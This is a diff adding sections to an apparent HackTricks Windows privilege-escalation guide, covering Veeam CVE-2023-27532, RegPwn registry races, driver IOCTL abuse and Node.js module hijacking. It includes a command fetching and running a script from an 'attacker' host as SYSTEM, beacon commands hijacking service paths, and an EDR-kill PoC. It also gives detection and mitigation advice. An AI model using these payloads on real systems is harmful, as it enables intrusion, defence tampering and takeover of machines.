@@ -42,6 +42,26 @@ There are different things in Windows that could **prevent you from enumerating 
 ../authentication-credentials-uac-and-efs/
 {{#endref}}
 
+### Admin Protection / UIAccess silent elevation
+
+UIAccess processes launched through `RAiLaunchAdminProcess` can be abused to reach High IL without prompts when AppInfo secure-path checks are bypassed. Check the dedicated UIAccess/Admin Protection bypass workflow here:
+
+{{#ref}}
+uiaccess-admin-protection-bypass.md
+{{#endref}}
+
+Secure Desktop accessibility registry propagation can be abused for an arbitrary SYSTEM registry write (RegPwn):
+
+{{#ref}}
+secure-desktop-accessibility-registry-propagation-regpwn.md
+{{#endref}}
+
+Recent Windows builds also introduced an **SMB arbitrary-port** LPE path where a privileged local NTLM authentication is reflected over a reused SMB TCP connection:
+
+{{#ref}}
+local-ntlm-reflection-via-smb-arbitrary-port.md
+{{#endref}}
+
 ## System Info
 
 ### Version info enumeration
@@ -228,6 +248,27 @@ Basically, this is the flaw that this bug exploits:
 
 You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).
 
+## Third-Party Auto-Updaters and Agent IPC (local privesc)
+
+Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:
+
+
+{{#ref}}
+abusing-auto-updaters-and-ipc.md
+{{#endref}}
+
+## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)
+
+Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.
+
+- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
+- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
+
+```powershell
+.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
+```
+
+The service executes the command as SYSTEM.
 ## KrbRelayUp
 
 A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.
@@ -490,6 +531,13 @@ Example: "Windows Help and Support" (Windows + F1), search for "command prompt",
 
 ## Services
 
+Service Triggers let Windows start a service when certain conditions occur (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Even without SERVICE_START rights you can often start privileged services by firing their triggers. See enumeration and activation techniques here:
+
+-
+{{#ref}}
+service-triggers.md
+{{#endref}}
+
 Get a list of services:
 
 ```bash
@@ -616,6 +664,38 @@ To change the Path of the binary executed:
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
 
+### Registry symlink race to arbitrary HKLM value write (ATConfig)
+
+Some Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect that privileged write into **any HKLM path**, giving an arbitrary HKLM **value write** primitive.
+
+Key locations (example: On-Screen Keyboard `osk`):
+
+- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
+- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
+- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.
+
+Abuse flow (CVE-2026-24291 / ATConfig):
+
+1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
+2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
+3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
+4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.
+
+Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:
+
+- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
+- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)
+
+Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.
+
+Example tooling (RegPwn BOF / standalone):
+
+```bash
+beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
+beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
+net start msiserver
+```
+
 ### Services registry AppendData/AddSubdirectory permissions
 
 If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**
@@ -640,8 +720,8 @@ C:\Program Files\Some Folder\Service.exe
 List all unquoted service paths, excluding those belonging to built-in Windows services:
 
 ```bash
-wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
-wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services
+wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services
 
 # Using PowerUp.ps1
 Get-ServiceUnquoted -Verbose
@@ -649,7 +729,7 @@ Get-ServiceUnquoted -Verbose
 
 ```bash
 for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
-	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
+	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
 		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
 	)
 )
@@ -713,6 +793,14 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
 ```
 
+### Notepad++ plugin autoload persistence/execution
+
+Notepad++ autoloads any plugin DLL under its `plugins` subfolders. If a writable portable/copy install is present, dropping a malicious plugin gives automatic code execution inside `notepad++.exe` on every launch (including from `DllMain` and plugin callbacks).
+
+{{#ref}}
+notepad-plus-plus-plugin-autoload-persistence.md
+{{#endref}}
+
 ### Run at startup
 
 **Check if you can overwrite some registry or binary that is going to be executed by a different user.**\
@@ -739,6 +827,80 @@ If a driver exposes an arbitrary kernel read/write primitive (common in poorly d
 arbitrary-kernel-rw-token-theft.md
 {{#endref}}
 
+For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:
+
+{{#ref}}
+kernel-race-condition-object-manager-slowdown.md
+{{#endref}}
+
+#### Registry hive memory corruption primitives
+
+Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:
+
+{{#ref}}
+windows-registry-hive-exploitation.md
+{{#endref}}
+
+#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths
+
+Some drivers accept a registry path from userland, validate only that it is a sane UTF-16 string, and then call `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` with `RTL_QUERY_REGISTRY_DIRECT` into a stack scalar such as `int readValue`. If `RTL_QUERY_REGISTRY_TYPECHECK` is missing, `EntryContext` is interpreted according to the **actual** registry type, not the type the developer expected.
+
+This creates two useful primitives:
+
+- **Confused deputy / oracle**: a user-controlled absolute `\Registry\...` path lets the driver query attacker-chosen keys, leak existence through return codes/logs, and sometimes read values the caller could not access directly.
+- **Kernel memory corruption**: a scalar destination such as `&readValue` becomes type-confused as a `REG_QWORD`, `UNICODE_STRING`, or sized binary buffer depending on the registry value type.
+
+Practical exploitation notes:
+
+- **Windows 8+ mitigation**: if the query hits an **untrusted hive** with `RTL_QUERY_REGISTRY_DIRECT` but without `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers crash with `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. To keep exploitability, look for **attacker-writable keys inside trusted system hives** instead of staging values under `HKCU`.
+- **Trusted-hive staging**: use NtObjectManager to enumerate writable descendants of `\Registry\Machine`, and re-run the scan with a duplicated **low-integrity** token to find keys reachable from sandboxed contexts:
+
+```powershell
+Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
+$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
+Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
+```
+
+- **`REG_QWORD`**: an 8-byte direct write into a 4-byte `int` corrupts adjacent stack data and can partially overwrite a nearby callback/function pointer.
+- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode expects `EntryContext` to point to a `UNICODE_STRING`. If the code first loads an attacker-controlled `REG_DWORD` into a stack scalar and then reuses that same buffer for a string read, the attacker controls `Length`/`MaximumLength` and partially influences the `Buffer` pointer, yielding a semi-controlled kernel write.
+- **`REG_BINARY`**: for large binary data, direct mode treats the first `LONG` at `EntryContext` as a signed buffer size. If a prior `REG_DWORD` read leaves a **negative** attacker-controlled value in the reused scalar, the next `REG_BINARY` query copies attacker bytes directly over adjacent stack slots, which is often the cleanest path to full callback-pointer overwrite.
+
+Strong hunting pattern: **heterogeneous registry reads into the same stack variable without reinitializing it**. Grep for `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, reused `EntryContext` pointers, and code paths where the first registry read controls whether a second read happens.
+
+#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)
+
+Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:
+
+- \\ .\\DeviceName\\anything
+- \\ .\\amsdk\\anyfile (from a real-world case)
+
+Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
+- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
+- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
+- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.
+
+Minimal PoC pattern (user mode):
+```c
+// Example based on a vulnerable antimalware driver
+#define IOCTL_REGISTER_PROCESS  0x80002010
+#define IOCTL_TERMINATE_PROCESS 0x80002048
+
+HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
+DWORD me = GetCurrentProcessId();
+DWORD target = /* PID to kill or open */;
+DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
+DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
+```
+
+Mitigations for developers
+- Always set FILE_DEVICE_SECURE_OPEN when creating device objects intended to be restricted by a DACL.
+- Validate caller context for privileged operations. Add PP/PPL checks before allowing process termination or handle returns.
+- Constrain IOCTLs (access masks, METHOD_*, input validation) and consider brokered models instead of direct kernel privileges.
+
+Detection ideas for defenders
+- Monitor user-mode opens of suspicious device names (e.g., \\ .\\amsdk*) and specific IOCTL sequences indicative of abuse.
+- Enforce Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) and maintain your own allow/deny lists.
+
 
 ## PATH DLL Hijacking
 
@@ -754,8 +916,74 @@ For more information about how to abuse this check:
 
 
 {{#ref}}
-dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
+dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
 {{#endref}}
+
+## Node.js / Electron module resolution hijacking via `C:\node_modules`
+
+This is a **Windows uncontrolled search path** variant that affects **Node.js** and **Electron** applications when they perform a bare import such as `require("foo")` and the expected module is **missing**.
+
+Node resolves packages by walking up the directory tree and checking `node_modules` folders on each parent. On Windows, that walk can reach the drive root, so an application launched from `C:\Users\Administrator\project\app.js` may end up probing:
+
+1. `C:\Users\Administrator\project\node_modules\foo`
+2. `C:\Users\Administrator\node_modules\foo`
+3. `C:\Users\node_modules\foo`
+4. `C:\node_modules\foo`
+
+If a **low-privileged user** can create `C:\node_modules`, they can plant a malicious `foo.js` (or package folder) and wait for a **higher-privileged Node/Electron process** to resolve the missing dependency. The payload executes in the security context of the victim process, so this becomes **LPE** whenever the target runs as an administrator, from an elevated scheduled task/service wrapper, or from an auto-started privileged desktop app.
+
+This is especially common when:
+
+- a dependency is declared in `optionalDependencies`
+- a third-party library wraps `require("foo")` in `try/catch` and continues on failure
+- a package was removed from production builds, omitted during packaging, or failed to install
+- the vulnerable `require()` lives deep inside the dependency tree instead of in the main application code
+
+### Hunting vulnerable targets
+
+Use **Procmon** to prove the resolution path:
+
+- Filter by `Process Name` = target executable (`node.exe`, the Electron app EXE, or the wrapper process)
+- Filter by `Path` `contains` `node_modules`
+- Focus on `NAME NOT FOUND` and the final successful open under `C:\node_modules`
+
+Useful code-review patterns in unpacked `.asar` files or application sources:
+
+```bash
+rg -n 'require\\("[^./]' .
+rg -n "require\\('[^./]" .
+rg -n 'optionalDependencies' .
+rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
+```
+
+### Exploitation
+
+1. Identify the **missing package name** from Procmon or source review.
+2. Create the root lookup directory if it does not already exist:
+
+```powershell
+mkdir C:\node_modules
+```
+
+3. Drop a module with the exact expected name:
+
+```javascript
+// C:\node_modules\foo.js
+require("child_process").exec("calc.exe")
+module.exports = {}
+```
+
+4. Trigger the victim application. If the application attempts `require("foo")` and the legitimate module is absent, Node may load `C:\node_modules\foo.js`.
+
+Real-world examples of missing optional modules that fit this pattern include `bluebird` and `utf-8-validate`, but the **technique** is the reusable part: find any **missing bare import** that a privileged Windows Node/Electron process will resolve.
+
+### Detection and hardening ideas
+
+- Alert when a user creates `C:\node_modules` or writes new `.js` files/packages there.
+- Hunt for high-integrity processes reading from `C:\node_modules\*`.
+- Package all runtime dependencies in production and audit `optionalDependencies` usage.
+- Review third-party code for silent `try { require("...") } catch {}` patterns.
+- Disable optional probes when the library supports it (for example, some `ws` deployments can avoid the legacy `utf-8-validate` probe with `WS_NO_UTF_8_VALIDATE=1`).
 
 ## Network
 
@@ -1204,6 +1432,7 @@ Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorActio
 
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
 C:\inetpub\wwwroot\web.config
 ```
 
@@ -1262,7 +1491,7 @@ You can always **ask the user to enter his credentials of even the credentials o
 
 ```bash
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
-$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
 
 #Get plaintext
 $cred.GetNetworkCredential() | fl
@@ -1456,11 +1685,33 @@ When data is sent through a pipe by a **client**, the **server** that set up the
 
 Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
+## Telephony tapsrv remote DWORD write to RCE
+
+The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:
+
+- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
+- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
+- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.
+
+More details:
+
+{{#ref}}
+telephony-tapsrv-arbitrary-dword-write-to-rce.md
+{{#endref}}
+
 ## Misc
 
 ### File Extensions that could execute stuff in Windows
 
 Check out the page **[https://filesec.io/](https://filesec.io/)**
+
+### Protocol handler / ShellExecute abuse via Markdown renderers
+
+Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:
+
+{{#ref}}
+../protocol-handler-shell-execute-abuse.md
+{{#endref}}
 
 ### **Monitoring Command Lines for passwords**
 
@@ -1719,6 +1970,29 @@ C:\Windows\System32\cng.sys
 - It sees the folder, **fails to resolve the actual driver**, and **crashes or halts boot**.
 - There’s **no fallback**, and **no recovery** without external intervention (e.g., boot repair or disk access).
 
+### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS
+
+When a **privileged service** writes logs/exports to a path read from a **writable config**, redirect that path with **Object Manager symlinks + NTFS mount points** to turn the privileged write into an arbitrary overwrite (even **without** SeCreateSymbolicLinkPrivilege).
+
+**Requirements**
+- Config storing the target path is writable by the attacker (e.g., `%ProgramData%\...\.ini`).
+- Ability to create a mount point to `\RPC Control` and an OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
+- A privileged operation that writes to that path (log, export, report).
+
+**Example chain**
+1. Read the config to recover the privileged log destination, e.g. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
+2. Redirect the path without admin:
+```cmd
+mkdir C:\users\iconics_user\AppData\Local\Temp\logs
+CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
+CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
+```
+3. Wait for the privileged component to write the log (e.g., admin triggers "send test SMS"). The write now lands in `C:\Windows\System32\cng.sys`.
+4. Inspect the overwritten target (hex/PE parser) to confirm corruption; reboot forces Windows to load the tampered driver path → **boot loop DoS**. This also generalizes to any protected file a privileged service will open for write.
+
+> `cng.sys` is normally loaded from `C:\Windows\System32\drivers\cng.sys`, but if a copy exists in `C:\Windows\System32\cng.sys` it can be attempted first, making it a reliable DoS sink for corrupt data.
+
+
 
 ## **From High Integrity to System**
 
@@ -1787,9 +2061,9 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
 [**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
 [**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
-[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.**\
+[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
 [**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
-[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
+[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
 [~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**
 
 **Exe**
@@ -1798,7 +2072,7 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 [**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
 [**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
 [**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
 [~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.
 
 **Bat**
@@ -1826,7 +2100,7 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 - [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
 - [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
 - [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
-- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
+- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
 - [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 - [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
@@ -1837,6 +2111,21 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 - [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)
 
+- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
 - [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
+
+- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
+- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
+- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
+- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
+- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
+- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
+- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
+- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
+- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
+- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
+- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
+- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
+- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
 
 {{#include ../../banners/hacktricks-training.md}}
